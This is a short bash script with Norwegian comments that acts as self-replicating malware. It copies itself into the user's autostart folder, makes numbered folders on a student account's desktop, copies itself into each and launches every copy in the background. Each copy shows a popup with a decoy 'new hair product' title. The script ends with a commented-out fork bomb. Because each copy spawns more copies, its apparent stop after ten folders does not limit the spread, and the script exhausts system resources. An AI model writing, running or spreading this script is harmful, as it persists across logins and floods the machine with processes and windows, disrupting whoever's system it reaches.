#!/bin/bash

tall=1
navn=0
popupboxnummer=1  # Initialize the popup counter

cp "$0" ~/.config/autostart/  # Copy the script to autostart directory

while [ $tall -gt 0 ]; do
    # lager en nytt Direvtory etter verdien 'C:\Windows, /System, eller /folder' er satt. utifra OSen
    new_dir="/home/elev/Desktop/$navn"
    mkdir "$new_dir"
    
    # Copy this script (using $0) into the newly created directory
    cp "$0" "$new_dir/"
    
    # Show a Zenity popup with the directory number
    zenity --info --title="Nytt Hår Produkt" --text="Dette er popupbox nummer $popupboxnummer"
    
    # Increment the popup counter
    popupboxnummer=$(($popupboxnummer + 1))

    # Run the copied script in the new directory
    bash "$new_dir/$(basename "$0")" &

    # Increment 'navn' to create a new folder in the next iteration
    navn=$(($navn + 1))
    
    # Set 'tall' to 5, but the loop runs indefinitely because 'tall' is always > 0
    tall=5

    # Optional safeguard to stop after creating a certain number of directories
    if [ $navn -ge 10 ]; then
        break
    fi
done

#
# fork() { fork | fork& } 
